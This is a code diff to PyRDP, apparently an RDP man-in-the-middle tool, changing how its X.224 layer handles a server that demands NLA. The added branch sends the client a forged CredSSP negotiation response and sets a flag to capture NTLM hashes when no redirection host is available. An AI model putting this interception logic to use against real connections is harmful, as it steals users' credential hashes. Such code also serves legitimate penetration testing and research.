@@ -8,7 +8,7 @@ from typing import Callable, Coroutine, Optional
 from logging import LoggerAdapter
 
 from pyrdp.core import defer
-from pyrdp.enum import NegotiationFailureCode, NegotiationType, NegotiationRequestFlags
+from pyrdp.enum import NegotiationFailureCode, NegotiationType, NegotiationRequestFlags, NegotiationProtocols
 from pyrdp.layer import X224Layer
 from pyrdp.mitm.state import RDPMITMState
 from pyrdp.parser import NegotiationRequestParser, NegotiationResponseParser
@@ -117,19 +117,27 @@ class X224MITM:
         parser = NegotiationResponseParser()
         response = parser.parse(pdu.payload)
         if isinstance(response, NegotiationFailurePDU):
-            if response.failureCode == NegotiationFailureCode.HYBRID_REQUIRED_BY_SERVER and self.state.canRedirect():
-                self.log.info("The server forces the use of NLA. Using redirection host: %(redirectionHost)s:%(redirectionPort)d", {
-                    "redirectionHost": self.state.config.redirectionHost,
-                    "redirectionPort": self.state.config.redirectionPort
-                })
+            if response.failureCode == NegotiationFailureCode.HYBRID_REQUIRED_BY_SERVER:
+                if self.state.canRedirect():
+                    self.log.info("The server forces the use of NLA. Using redirection host: %(redirectionHost)s:%(redirectionPort)d", {
+                        "redirectionHost": self.state.config.redirectionHost,
+                        "redirectionPort": self.state.config.redirectionPort
+                    })
 
-                # Disconnect from current server
-                self.disconnector()
+                    # Disconnect from current server
+                    self.disconnector()
 
-                # Use redirection host and replay sequence starting from the connection request
-                self.state.useRedirectionHost()
-                self.onConnectionRequest(self.originalConnectionRequest)
-                return
+                    # Use redirection host and replay sequence starting from the connection request
+                    self.state.useRedirectionHost()
+                    self.onConnectionRequest(self.originalConnectionRequest)
+                    return
+                else:
+                    # Respond with a RDP negotiation answer to proceed and catch NTLM
+                    self.log.info("Server requires CredSSP. Closing connection with server and attempting to catch NTML hashes.")
+                    payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.CRED_SSP))
+                    self.state.ntlmCatch = True
+
+                    self.disconnector()
             else:
                 self.log.info("The server failed the negotiation. Error: %(error)s", {"error": NegotiationFailureCode.getMessage(response.failureCode)})
                 payload = pdu.payload
